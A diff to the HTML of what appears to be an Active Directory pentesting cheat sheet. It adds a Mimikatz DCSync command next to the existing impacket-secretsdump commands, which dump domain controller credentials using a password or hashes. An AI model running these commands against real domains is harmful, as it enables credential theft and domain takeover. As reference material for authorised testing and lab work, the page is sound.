@@ -57,6 +57,8 @@
 </span></span><span class="line"><span class="cl">impacket-secretsdump -just-dc username:password@10.10.11.10
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With hashes</span>
 </span></span><span class="line"><span class="cl">impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10
+</span></span></code></pre></div><h4 id="mimikatz-from-windows">Mimikatz (From Windows)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;lsadump::dcsync /domain:EXAMPLE.COM /user:administrator&#39;</span> <span class="n">exit</span>
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
